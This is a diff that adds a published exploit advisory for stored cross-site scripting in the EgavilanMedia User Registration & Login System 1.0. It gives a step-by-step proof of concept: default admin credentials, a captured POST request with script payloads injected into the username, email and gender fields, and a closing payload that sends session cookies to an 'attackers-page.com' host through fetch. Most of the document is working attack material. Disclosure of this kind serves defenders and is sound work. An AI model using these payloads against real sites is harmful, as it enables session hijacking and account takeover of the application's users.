@@ -1,0 +1,37 @@
+# Exploit Title: EgavilanMedia User Registration & Login System with Admin Panel 1.0 - Multiple Stored Cross-Site Scripting
+# Date: 30-12-2020
+# Exploit Author: Mesut Cetin
+# Vendor Homepage: http://egavilanmedia.com
+# Version: 1.0
+# Tested on Windows 10, Firefox 83.0, Burp Suite Professional v1.7.34
+
+Vulnerable parameter: email, gender, username
+Payload: <script>alert(document.cookie)</script>
+
+Proof of Concept:
+
+To bypass client-side filter, we will use Burp Suite. Reproduce the vulnerability by following the steps:
+
+1. Login with default credentials "admin:password" at the demo page at: http://demo.egavilanmedia.com/User%20Registration%20and%20Login%20System%20With%20Admin%20Panel/profile.php
+2. Click above right on the "Profile" tab
+3. Navigate to the "Edit Profile" tab
+4. In Firefox, use Foxyproxy and click on "Intercept" within Burp Suite. Press on "Update password" button at demo page.
+5. Capture the POST request in Burp Suite and manipulate the parameter as shown:
+
+POST /User%20Registration%20and%20Login%20System%20With%20Admin%20Panel/admin/profile_action.php HTTP/1.1
+Host: demo.egavilanmedia.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 180
+Origin: http://demo.egavilanmedia.com
+Connection: close
+Referer: http://demo.egavilanmedia.com/User%20Registration%20and%20Login%20System%20With%20Admin%20Panel/admin/profile.php
+Cookie: PHPSESSID=944b2es2eb67f971af305b2105e35c3e
+
+fullname=admin&username=<script>alert(document.cookie)</script>&email=<script>alert('PoC 2')</script>&gender==<script>alert('PoC 3')</script>&action=update_admin
+
+6. Forward the request and refresh the page. You'll receive three different XSS pop-ups. One of them contains the PHPSESSID cookie. By using payloads like <BODY ONLOAD=fetch(`http://attackers-page.com/${document.cookie}`)>, the session cookies can be send to the attacker.
